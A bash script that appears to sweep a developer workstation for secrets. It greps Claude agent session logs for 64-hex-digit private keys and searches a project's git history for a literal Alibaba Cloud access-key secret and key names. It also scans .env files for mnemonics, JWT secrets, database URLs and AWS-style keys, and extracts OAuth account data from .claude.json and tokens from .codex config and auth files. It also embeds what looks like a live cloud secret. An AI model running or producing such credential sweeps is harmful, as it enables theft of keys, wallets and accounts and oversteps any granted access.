#!/bin/bash
set +e
export LC_ALL=C
H=/home/coder
R="$H/.claude/projects/-home-coder--lumii-runtime-home"

echo "### F3_STAT"
for f in "$R/79bc0b89-3150-48f6-b49e-26a6edabec67/subagents/agent-ae638ffbdaed812eb.jsonl" "$R/16cc48f3-1db5-48a5-ba69-631b5e1c39fb.jsonl" "$R/c5363a80-3c0b-45d0-8ab5-cd7e81dd66b3.jsonl"; do ls -la "$f" 2>/dev/null; done
echo "### F3_0x64_CTX"
for f in "$R/79bc0b89-3150-48f6-b49e-26a6edabec67/subagents/agent-ae638ffbdaed812eb.jsonl" "$R/16cc48f3-1db5-48a5-ba69-631b5e1c39fb.jsonl" "$R/c5363a80-3c0b-45d0-8ab5-cd7e81dd66b3.jsonl"; do
  echo "@@ $f"
  timeout 60 grep -aoE '.{0,90}0x[0-9a-fA-F]{64}.{0,90}' "$f" 2>/dev/null | sort -u | head -20
done
echo "### F3_0x64_exact"
for f in "$R/79bc0b89-3150-48f6-b49e-26a6edabec67/subagents/agent-ae638ffbdaed812eb.jsonl" "$R/16cc48f3-1db5-48a5-ba69-631b5e1c39fb.jsonl" "$R/c5363a80-3c0b-45d0-8ab5-cd7e81dd66b3.jsonl"; do
  timeout 40 grep -aoE '0x[0-9a-fA-F]{64}' "$f" 2>/dev/null | sort -u
done | sort -u | head -40

echo "### PHASE_F3_DONE"

# LTAI secretpair real context
echo "### ALI_SECRET_CTX"
timeout 120 git -C "$H/lumii-goldenyears-processor" log --all -p 2>/dev/null | grep -aoE '.{0,100}NhCUpDoOSsNuQDrPLvKStlCGWk6sTQ1E.{0,60}' | sort -u | head -10
echo "### ALI_AKID_CTX"
timeout 120 git -C "$H/lumii-goldenyears-processor" log --all -p 2>/dev/null | grep -aoE '.{0,40}(AccessKeyId|AccessKeySecret|OSSAccessKeyId|oss-access|ALIBABA_CLOUD|ALIYUN|aliyuncs|sts\.aliyun)[^\n]{0,90}' | sort -u | head -25
echo "### ALI_TREE_CTX"
timeout 40 grep -arE '(AccessKeyId|AccessKeySecret|OSSAccessKeyId|ALIBABA_CLOUD|ALIYUN_|aliyuncs)' "$H/lumii-goldenyears-processor" --exclude-dir=.git --exclude-dir=.gradle -l 2>/dev/null | head -15
echo "### PHASE_ALI_DONE"

# worktree env files
echo "### WORKTREE_ENV_FILES"
for f in "$H/lumii-work/.env.dev" "$H/lumii-work/.claude/worktrees/multi-agent-runtimes/.env.dev" "$H/lumii-work/.claude/worktrees/directory-bulk-ux/.env.dev"; do
  [ -f "$f" ] && { echo "@@ $f ($(stat -c %s "$f")b)"; grep -aiE 'zoofi|wand|0xC56f|0xFE18|JWT_SECRET|DATABASE_URL|postgres|mysql|redis|PRIVATE_KEY|mnemonic|AKIA|LTAI|ASIA' "$f" 2>/dev/null | head -30; }
done
echo "### PHASE_ENV_DONE"

# .claude.json oauth full
echo "### CLAUDE_JSON_OAUTH"
[ -f "$H/.claude.json" ] && timeout 20 grep -aoE '"oauthAccount":\{[^}]{0,500}' "$H/.claude.json" 2>/dev/null | head -3
echo "### .codex grep secrets"
timeout 30 grep -aoiE '(api_key|token|secret|password)[^,]{0,100}' "$H/.codex/config.toml" 2>/dev/null | head -10
find "$H/.codex" -maxdepth 2 -name '*.toml' -o -maxdepth 2 -name 'auth.json' 2>/dev/null | head
echo "### PHASE_JSON_DONE"
echo "### ALLDONE3"
